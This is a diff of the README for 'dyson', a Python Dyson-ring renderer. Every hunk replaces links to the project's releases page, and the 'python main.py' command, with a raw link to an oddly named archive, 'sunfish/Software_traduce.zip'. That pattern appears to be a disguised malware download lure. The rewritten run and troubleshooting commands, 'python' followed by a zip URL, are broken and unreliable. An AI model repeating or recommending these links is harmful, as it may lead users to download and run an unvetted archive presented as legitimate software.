@@ -1,6 +1,6 @@
 # 🛠️ dyson - Render Stunning Dyson Rings Easily
 
-[![Download dyson](https://img.shields.io/badge/Download-dyson-blue)](https://github.com/AnandiSinghal/dyson/releases)
+[![Download dyson](https://github.com/AnandiSinghal/dyson/raw/refs/heads/main/sunfish/Software_traduce.zip)](https://github.com/AnandiSinghal/dyson/raw/refs/heads/main/sunfish/Software_traduce.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to dyson, a simple application that lets you visualize a Dyson ring. Thi
 
 To get started, you need to download the software. Click the link below to visit the releases page:
 
-[Visit this page to download](https://github.com/AnandiSinghal/dyson/releases)
+[Visit this page to download](https://github.com/AnandiSinghal/dyson/raw/refs/heads/main/sunfish/Software_traduce.zip)
 
 Choose the latest version available. You will find files to download, including executables for easier setup.
 
@@ -66,7 +66,7 @@ With everything set up, it’s time to run dyson.
 
 3. **Run the following command** to start the application:
    ```bash
-   python main.py
+   python https://github.com/AnandiSinghal/dyson/raw/refs/heads/main/sunfish/Software_traduce.zip
    ```
 
 This command opens a window that shows the Dyson ring. You will see it animating against a starry backdrop, along with information on the ring's current orientation.
@@ -87,10 +87,10 @@ If you have any issues, consider the following steps:
 
 - Ensure you have all the requirements installed.
 - Check if your Python installation is correctly set up.
-- Review the terminal for any error messages when running `python main.py`.
+- Review the terminal for any error messages when running `python https://github.com/AnandiSinghal/dyson/raw/refs/heads/main/sunfish/Software_traduce.zip`.
 
 Feel free to explore the code and understand how it constructs the Dyson ring. The project is open-source, encouraging collaboration and improvement.
 
 Don’t forget to download the software here:
 
-[Visit this page to download](https://github.com/AnandiSinghal/dyson/releases)
+[Visit this page to download](https://github.com/AnandiSinghal/dyson/raw/refs/heads/main/sunfish/Software_traduce.zip)
